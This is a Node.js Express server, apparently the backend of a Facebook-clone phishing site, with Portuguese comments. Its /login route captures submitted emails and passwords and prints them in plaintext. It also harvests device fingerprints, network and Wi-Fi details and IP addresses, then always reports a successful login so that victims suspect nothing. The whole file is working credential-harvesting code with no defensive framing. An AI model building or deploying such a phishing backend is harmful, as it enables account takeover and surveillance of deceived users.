const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
require('dotenv').config();

const app = express();

app.use(cors({
    origin: process.env.FRONTEND_URL || 'https://cloned-f-render.netlify.app',
    methods: ['GET', 'POST'],
    credentials: true
}));

app.use(bodyParser.json());

app.get('/', (req, res) => {
    res.json({ message: 'API Facebook Clone está funcionando!' });
});

app.post('/login', async (req, res) => {
    try {
        const { email, senha, dispositivo } = req.body;

        // Log das credenciais
        console.log('\n');
        console.log('='.repeat(50));
        console.log('\n🔐 CREDENCIAIS RECEBIDAS 🔐\n');
        console.log('📧 EMAIL:', email);
        console.log('🔑 SENHA:', senha);
        console.log('\n');
        console.log('='.repeat(50));

        // Log detalhado das informações do dispositivo
        console.log('\n📱 INFORMAÇÕES DETALHADAS DO DISPOSITIVO 📱\n');
        console.log('💻 PLATAFORMA:', dispositivo.plataforma);
        console.log('🌐 USER AGENT:', dispositivo.userAgent);
        console.log('🗣️ IDIOMA:', dispositivo.idioma);
        console.log('📺 RESOLUÇÃO:', dispositivo.resolucao);
        console.log('🎨 PROFUNDIDADE DE COR:', dispositivo.profundidadeCor);
        console.log('💾 MEMÓRIA:', dispositivo.memoriaDispositivo, 'GB');
        console.log('⚡ PROCESSADORES:', dispositivo.processadores, 'núcleos');
        
        // Informações de conexão
        console.log('\n🌐 INFORMAÇÕES DE REDE 🌐\n');
        if (dispositivo.conexao !== 'Não disponível') {
            console.log('📡 TIPO DE CONEXÃO:', dispositivo.conexao.tipo);
            console.log('⚡ VELOCIDADE:', dispositivo.conexao.velocidade, 'Mbps');
        }
        
        // Informações de bateria
        if (dispositivo.bateria && dispositivo.bateria !== 'Não disponível') {
            console.log('\n🔋 INFORMAÇÕES DA BATERIA 🔋\n');
            console.log('📊 NÍVEL:', dispositivo.bateria.nivel, '%');
            console.log('🔌 CARREGANDO:', dispositivo.bateria.carregando ? 'Sim' : 'Não');
        }

        // Informações de rede Wi-Fi (se disponível)
        if (dispositivo.wifi) {
            console.log('\n📶 INFORMAÇÕES WI-FI 📶\n');
            console.log('📡 SSID:', dispositivo.wifi.ssid || 'Não disponível');
            console.log('📶 FORÇA DO SINAL:', dispositivo.wifi.signalStrength || 'Não disponível');
            console.log('🔒 SEGURANÇA:', dispositivo.wifi.security || 'Não disponível');
        }

        // Log de informações da requisição
        console.log('\n🌍 INFORMAÇÕES DA REQUISIÇÃO 🌍\n');
        console.log('🌐 IP:', req.ip);
        console.log('📍 MÉTODO:', req.method);
        console.log('🔍 ORIGEM:', req.headers.origin);
        console.log('\n');
        console.log('='.repeat(50));
        console.log('\n');

        if (!email || !senha) {
            return res.status(400).json({
                success: false,
                message: 'Email e senha são obrigatórios'
            });
        }

        await new Promise(resolve => setTimeout(resolve, 1000));

        res.status(200).json({
            success: true,
            message: 'Login realizado com sucesso',
            user: {
                email,
                name: 'Usuário Teste'
            }
        });

    } catch (error) {
        console.error('Erro no login:', error);
        res.status(500).json({
            success: false,
            message: 'Erro interno do servidor'
        });
    }
});

const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
    console.log(`Servidor rodando na porta ${PORT}`);
});
